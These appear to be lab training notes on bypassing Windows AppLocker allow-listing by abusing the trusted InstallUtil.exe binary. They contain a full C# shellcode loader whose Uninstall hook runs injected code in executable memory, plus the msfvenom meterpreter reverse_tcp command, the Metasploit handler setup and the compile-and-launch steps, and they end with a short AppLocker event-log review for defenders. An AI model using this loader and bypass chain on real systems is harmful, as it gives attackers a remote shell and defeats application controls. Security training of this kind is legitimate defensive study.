# Application Allow List Bypass Notes

List of app bypasses
[UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)


Start the AppLocker service on Windows by running 

```Get-Service appidsvc | Start-Service```

verify applocker settings

```
cd \tools
.\meterpreter.exe
(Get-AppLockerPolicy -Local).RuleCollections
.\nc.exe
```

Identiy .NET tools

```
Get-ChildItem -name csc.exe -Path C:\Windows\Microsoft.NET -Recurse
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe
Get-ChildItem -name installutil.exe -Path C:\Windows\Microsoft.NET -Recurse
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe
```

Examine evasion code

cat Shellcode.cs


```
/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause

Minor cleanup and clarity changes by Joshua Wright <josh@wr1ght.net> @joswr1ght
*/
using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;


public class Program
{
    public static void Main()
    {
        //Add any behaviour here to throw off sandbox execution/analysts :)
        Console.WriteLine("Hello From Main...I Don't Do Anything.\n");
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Shellcode.Exec();
    }
}

public class Shellcode
{
    public static void Exec()
    {
        // Paste Metasploit payload below
        // msfvenom --payload windows/meterpreter/reverse_tcp LHOST=10.10.75.1 -f csharp
        // The payload will start with byte[] buf = new byte[...


        //
        // Leave everything else as-is
        //
        UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf .Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(buf , 0, (IntPtr)(funcAddr), buf .Length);
        IntPtr hThread = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr pinfo = IntPtr.Zero;

        // execute native code
        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern bool VirtualFree(IntPtr lpAddress,
            UInt32 dwSize, UInt32 dwFreeType);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
            );

    [DllImport("kernel32")]
    private static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );

    [DllImport("kernel32")]
    private static extern IntPtr GetModuleHandle(
            string moduleName
            );

    [DllImport("kernel32")]
    private static extern UInt32 GetProcAddress(
            IntPtr hModule,
            string procName
            );

    [DllImport("kernel32")]
    private static extern UInt32 LoadLibrary(
            string lpFileName
            );

    [DllImport("kernel32")]
    private static extern UInt32 GetLastError();
}
```

prepare evasion code

```
msfvenom --payload windows/meterpreter/reverse_tcp LHOST=10.10.75.1 -f csharp
```

take this above and put into the shellcode vaues in the Shellcode.cs above

Prepare Callback Handler

```
msfconsole -qr ~/labs/quick/handler.rc
```

Compile Shellcode.cs

```
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /unsafe /platform:x86 /out:shellcode.exe Shellcode.cs
Get-ChildItem .\shellcode.exe
```

Run the shellcode

```
.\shellcode.exe
```

uninstall

```
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U shellcode.exe
```

Defender analysis

```
Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' | Select-Object -First 10
Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' | Where-Object -Property Id -EQ 8004
$start = Get-Date -Format '5/12/2022 10:41:26'
Get-WinEvent -FilterHashTable @{LogName='Microsoft-Windows-AppLocker/EXE and DLL'; Id=8002,8004; StartTime=$start;} | Select-Object TimeCreated, Id, Message, ProcessId, Userid | ConvertTo-Html | Out-File c:\temp\event-report.html
Start-Process C:\temp\event-report.html
```
